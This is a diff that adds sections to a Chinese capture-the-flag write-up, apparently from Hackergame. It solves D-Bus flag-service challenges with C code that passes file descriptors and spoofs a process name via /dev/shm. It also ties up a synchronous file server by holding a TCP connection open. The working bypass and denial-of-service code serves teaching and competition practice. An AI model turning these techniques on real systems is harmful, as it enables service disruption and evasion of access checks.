@@ -358,7 +358,7 @@ Flag 为 `flag{p0werful_r3gular_expressi0n_easy_5671700122}`。
 （代码待补全）
 
 最后，建议将 Token、难度和正则表达式写在同一个文件中，然后：
-```
+```bash
 nc XXXXXX:XXX 13.ans
 ```
 
@@ -368,3 +368,289 @@ Flag 为 `flag{pow3rful_r3gular_expressi0n_medium_70a46e715e}`。
 
 参考资料：
 [用正则表达式匹配3的任意倍数 - 腾讯云开发者社区](https://cloud.tencent.com/developer/article/1777692)
+
+## 不太分布式的软总线
+直接查看附件的代码，可以看到：
+- `flagserver` 在 System Bus 中创建了一个名为 `cn.edu.ustc.lug.hack.FlagService` 的 Bus
+- 在这个 Bus 的路径 `/cn/edu/ustc/lug/hack/FlagService` 上注册了一个 Object
+- 这个对象提供了名为 `cn.edu.ustc.lug.hack.FlagService` 的 Interface
+- 这个接口提供了 `GetFlag1`, `GetFlag2`, `GetFlag3` 三个 Method
+
+### What DBus Gonna Do?
+查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现只需要带上一个字符串 `Please give me flag1` 调用 `GetFlag1` 方法即可。这个操作可以直接用 `dbus-send` 指令来完成：
+```sh
+#!/usr/bin/bash
+dbus-send \
+    --system \
+    --print-reply \
+    --dest="cn.edu.ustc.lug.hack.FlagService" \
+    --type=method_call \
+    /cn/edu/ustc/lug/hack/FlagService \
+    cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
+    string:'Please give me flag1'
+```
+
+上传这个 Script 即可拿到第一个 Flag。
+
+Flag 为 `flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_6614b12106}`。
+
+### If I Could Be A File Descriptor
+查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现：
+- 这次的请求需要带上一个叫做 `GUnixFDList` 的东西
+- 看起来……似乎是需要发送一个文件描述符？
+- 因为检查了 `/proc/self/fd/<FD_NUM>` 指向的链接，所以这个文件描述符指向的文件的名字里还不能包含 `/` 这样的字符
+- `flagserver` 会从这个文件里读 100 字节，并且检查这个字节对应的字符串的内容
+
+尽管在不同进程之间，文件描述符的**值**无法简单地共享，但发送文件描述符时，内核可以为另外一个进程创建一个新的文件描述符，而这个文件描述符指向同一个文件。我想 DBus 也应该为我们实现了这一点。
+
+`flagserver` 使用 `GIO` 来处理 DBus 上的消息。而 `getflag3.c` 中也给出了使用 `GIO` 请求方法的例子。那么我们也用 `GIO` 来调用 DBus 方法吧。
+
+在 `GIO` 的文档中可以看到，`g_dbus_connection_call_with_unix_fd_list_sync()` 函数就可以发送一个带有文件描述符列表的调用。
+
+那么，发送什么文件描述符呢？我首先想到的思路是使用 POSIX Shared Memory，然而实际上 POSIX Shared Memory 会在 `/dev/shm` 中创建一个文件，而文件描述符会指向这个文件，因此这个方法行不通。
+
+除此之外，Socket 也可以拥有文件描述符，而且我们应该可以很容易地创建这个文件描述符。Socket 可以和文件系统中的地址绑定，然而我们并不需要一个有名字的 Socket，因为这样会在文件系统中有一个路径（而我们不希望这样做）。因此我们需要创建无名的 Socket。
+
+在 Linux 中，`socketpair()` 调用可以创建一对无名的 Socket，这对 Socket 的两端是相连接的——即，向一个 Socket 发送的数据可以被另一个 Socket 接收到，反过来也一样。因此我们可以用 `socketpair()` 创建一对 Socket，并将其中一个 Socket 的文件描述符通过 `g_dbus_connection_call_with_unix_fd_list_sync()` 函数发送给 `flagserver`。
+
+以下是 C 源代码：
+```c
+#include <gio/gio.h>
+#include <glib.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <stdio.h>
+
+#define DEST "cn.edu.ustc.lug.hack.FlagService"
+#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
+#define METHOD "GetFlag2"
+#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"
+
+int main() {
+    g_print("Creating socket...\n");
+    int fds[2];
+    socketpair(PF_LOCAL, SOCK_STREAM, 0, fds);
+    int this_fd = fds[0];
+    int remote_fd = fds[1];
+	// Initiate connection
+	GError *error = NULL;
+    GDBusConnection *connection;
+    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
+    if (!connection) {
+        g_printerr("Failed to connect to the system bus: %s\n", error->message);
+        g_error_free(error);
+        return EXIT_FAILURE;
+    }
+    g_print("Connected to system bus.\n");
+	// Append remote_fd to fd list, this function return handle of fd in this list
+    GUnixFDList* fdlist = g_unix_fd_list_new();
+    gint g_fd = g_unix_fd_list_append(fdlist, remote_fd, &error);
+    if (g_fd == -1) {
+        g_printerr("Append fd failed: %s\n", error->message);
+        return EXIT_FAILURE;
+    }
+	// Send some message to socket before methd call
+    char buf[128];
+    memset(buf, 0, sizeof(buf));
+    sprintf(buf, "Please give me flag2\n");
+    int size = write(this_fd, buf, sizeof(buf));
+    if (size == -1) {
+        g_printerr("Write to socket failed\n");
+        return EXIT_FAILURE;
+    }
+	// Call remote method
+    g_print("Calling remote method...\n");
+    GVariant *result;
+    result = g_dbus_connection_call_with_unix_fd_list_sync(
+        connection,
+        DEST,        // destination
+        OBJECT_PATH, // object path
+        INTERFACE,   // interface name
+        METHOD,      // method
+        g_variant_new("(h)", g_fd),
+        NULL,        // expected return type
+        G_DBUS_CALL_FLAGS_NONE,
+        -1,
+        fdlist,
+        NULL,
+        NULL,
+        &error
+    );
+    if (!result) {
+        g_printerr("Remote call failed: %s\n", error->message);
+        return EXIT_FAILURE;
+    }
+    gchar *response;
+    g_variant_get(result, "(s)", &response);
+    g_print("Calling remote method success: %s\n", response);
+    return EXIT_SUCCESS;
+}
+```
+
+Makefile:
+```makefile
+flag2: flag2.c
+	gcc -fdiagnostics-color=always -g flag2.c `pkg-config --cflags --libs gio-2.0` -o flag2
+```
+
+编译后上传执行即可获取第二个 Flag。
+
+Flag 为 `flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_277ff65d23}`。
+
+### Comm Say Maybe
+查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现：
+- 和 `What DBus Gonna Do?` 一样，不过这次不需要你发送任何数据与
+- 但是 `flagserver` 会获取调用者的 pid，然后检查 `/proc/<pid>/comm`，也就是调用者进程被执行时的指令（不包括参数）
+- 可执行程序的名字是应该是 `getflag3`
+
+查看附件中的 `server.py` 可以看到，我们的可执行程序会被写入到 `/dev/shm/executable` 中执行。那么我们直接复制自己到 `/dev/shm/getflag3`，然后执行 `/dev/shm/getflag3` 即可。
+
+出人意料的是，这确实可以做到。`/dev/shm` 确实是可以被读写的！这比我一开始解出来时的想法要简单太多了，因为我一开始认为无法在 `/dev/shm` 中创建文件。既然这样，那就只需要简单修改一下 `getflag.c` 就可以做到让指令为 `getflag3` 的进程进行调用了：
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <gio/gio.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#define DEST "cn.edu.ustc.lug.hack.FlagService"
+#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
+#define METHOD "GetFlag3"
+#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"
+
+int main(int argc, char **argv)
+{
+    // Copy and execute
+    if (argc == 1)
+    {
+        system("cp /dev/shm/executable /dev/shm/getflag3");
+        system("/dev/shm/getflag3 placeholder_to_alter_argc");
+        return 0;
+    }
+    GError *error = NULL;
+    GDBusConnection *connection;
+    GVariant *result;
+
+    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
+    if (!connection)
+    {
+        g_printerr("Failed to connect to the system bus: %s\n", error->message);
+        g_error_free(error);
+        return EXIT_FAILURE;
+    }
+
+    // Call the D-Bus method
+    result = g_dbus_connection_call_sync(
+        connection,
+        DEST,        // destination
+        OBJECT_PATH, // object path
+        INTERFACE,   // interface name
+        METHOD,      // method
+        NULL,        // parameters
+        NULL,        // expected return type
+        G_DBUS_CALL_FLAGS_NONE,
+        -1, // timeout (use default)
+        NULL, &error);
+
+    if (result)
+    {
+        // Here we modifided to let it print
+        gchar *rev;
+        g_variant_get(result, "(s)", &rev);
+        g_print("Result: %s\n", rev);
+        g_variant_unref(result);
+    }
+    else
+    {
+        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
+        g_error_free(error);
+    }
+
+    g_object_unref(connection);
+
+    return EXIT_SUCCESS;
+}
+```
+
+编译后上传执行即可获取第三个 Flag。
+
+Flag 为 `flag{prprprprprCTL_15your_FRiEND_ec8c8f54d7}`。
+
+### Comm Say Maybe 的另一个思路
+既然都在 `/dev/shm` 里面了……为什么我们不创建一个名叫 `getflag3` 的 POSIX Shared Memory 呢？
+
+思路大概是这样：
+- 以只读方式，用 `shm_open()` 创建名叫 `getflag3` 但权限为 `777` 的 POSIX Shared Memory
+- Fork 自己，然后让字进程以可读写的方式用 `shm_open()` 打开名叫 `getflag3` 的 POSIX shm，`ftruncate()` 扩展这片内存的空间，然后用 `mmap()` 将这片内存映射到自己的内存空间中。
+- 让子进程打开 `/dev/shm/executable`，读取里面的内容，然后写入到 shm 中。子进程在这个时候就结束了。
+- 此时只有原进程有以只读方式打开了 `/dev/shm/getflag3`，没有进程以可写的方式打开它。因此 `/dev/shm/getflag3` 可以被执行了。
+- 原进程以带参数的方式执行 `/dev/shm/getflag3`, 这样新的进程获取到的 `argc` 是大于 1 的，正常执行 DBus 访问的代码。
+- 获得 Flag！
+
+事实上我一开始也是这样做的，因为想这个问题不会这么简单。也许在程序开始运行后，`/dev/shm` 是不可以以文件方式读写的。
+
+这个思路是可以运行的！但确实略显得麻烦……所以在这里只把它贴出来，不会详细讲解。
+
+## 动画分享
+### 只要不停下 HTTP 服务，响应就会不断延伸
+观察附件中的 Rust `fileserver` 代码，尽管没有找到会让 `fileserver` 崩溃的契机，但我们可以看到 `fileserver` 是以**完全同步**的方式运行的。也就是只会在处理完一个请求之后才会开始处理下一个请求。
+
+在 `server.py` 中可以看到，我们的程序最多只会执行 10 秒就会被杀死，连接也会就此断开，而 HTTP Server 也得以处理下一个请求。我们也许需要让另一个进程来保持这个连接。
+
+这里就可以使用 `fork()` 创建一个新的进程来保持连接了！原进程在 `fork()` 之后，等待新进程建立连接，然后退出。而新进程可以保持这个 TCP 连接不断开，即使不发送任何数据也是可行的。
+
+下面是 C 源代码：
+```c
+#include <stdio.h>
+#include <strings.h>
+#include <strings.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+int main() {
+    int pid = fork();
+    if (pid != 0) {
+        sleep(2);
+        printf("subprocess %d spwaned, exiting.\n", pid);
+        return 0;
+    }
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        printf("open socket fd failed.\n");
+    }
+
+    struct sockaddr_in addr;
+    bzero(&addr, sizeof(addr));
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(8000);
+    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+    if (connect(sockfd, (struct sockaddr*)(&addr), sizeof(addr)) != 0) {
+        printf("connect failed.\n");
+        return 0;
+    }
+    printf("connected\n");
+
+    sleep(1000);
+    printf("exit\n");
+    return 0;
+}
+```
+
+~~真的有人会直接用 C 写 TCP 吗？~~
+
+注意上面的源代码如果直接使用 gcc 编译，上传运行可能会报错：
+```plaintext
+/dev/shm/executable: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /dev/shm/executable)
+```
+
+因此编译时需要加上 `--static` 选项。然后上传运行即可获得 Flag。
+
+Flag 为 `flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_bd4dc3991d}`。
+
